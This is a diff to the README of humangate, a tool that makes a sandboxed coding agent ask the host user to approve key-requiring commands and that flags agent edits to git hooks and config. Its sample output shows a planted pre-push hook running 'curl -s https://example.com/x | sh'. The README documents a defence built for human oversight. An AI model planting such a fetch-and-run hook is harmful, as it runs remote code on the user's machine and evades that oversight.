@@ -1,9 +1,15 @@
 # humangate
 
-Coding agents are safest in a sandbox without your keys - but then they can't sign a commit,
-push a branch or do anything else that needs them. humangate lets the agent ask you to run such
-a command on the host: you see why it's needed and exactly what will run, and nothing happens
-until you say yes.
+Coding agents are safest in a sandbox without your keys. humangate keeps you in the loop for
+what the agent can't be trusted to do alone:
+
+- **Actions that need your keys.** A sandboxed agent can't sign a commit, push a branch or do
+  anything else that needs them. It asks you to run such a command on the host instead: you see
+  why it's needed and exactly what will run, and nothing happens until you say yes.
+- **Files it shouldn't change behind your back.** The agent can still edit git hooks and
+  config, the tools you approve, and whatever those run - `package.json` scripts, CI workflows,
+  an `.envrc`. humangate watches them and shows you any change as a diff the moment it
+  happens. Until you accept it, no request runs.
 
 In the sandbox, the agent asks:
 
@@ -18,6 +24,7 @@ On the host, you decide:
 $ humangate loop
 humangate loop watching /home/me/project/.humangate/queue (Ctrl-C to stop)
 Tools: git-push, git-push-with-force, git-sign
+Guarding: git config, .humangate/tools, ~/.humangate/tools, .humangate/guard, .git/hooks, package.json (18 files)
 Log: /home/me/.humangate/logs/home-me-project.jsonl
 
 
@@ -45,8 +52,26 @@ Exit code 0 - result sent to the agent
 The agent's `request` then prints the same output and exits with the tool's exit code.
 
 What can be requested is up to you: every executable in a project's `.humangate/tools/`, or in
-`~/.humangate/tools/` on the host for all projects, is one tool. humangate only carries requests
-and answers, and runs a tool once you approve it.
+`~/.humangate/tools/` on the host for all projects, is one tool. humangate carries requests and
+answers, and runs a tool only once you approve it.
+
+Meanwhile the same loop watches the guarded files. If the agent edits, say, a `pre-push` hook,
+you hear the terminal bell and see the diff right away:
+
+```
+── Guarded files changed ──
+
+Requests are refused until you accept this or it's reverted.
+
+.git/hooks/pre-push added
+  @@ -0,0 +1,2 @@
+  +#!/bin/sh
+  +curl -s https://example.com/x | sh
+
+Accept the change? (↑/↓ and Enter, or a shortcut letter)
+  ❯ n  No - refuse requests until it's reverted
+    y  Yes, accept it as the approved state
+```
 
 ## Install
 
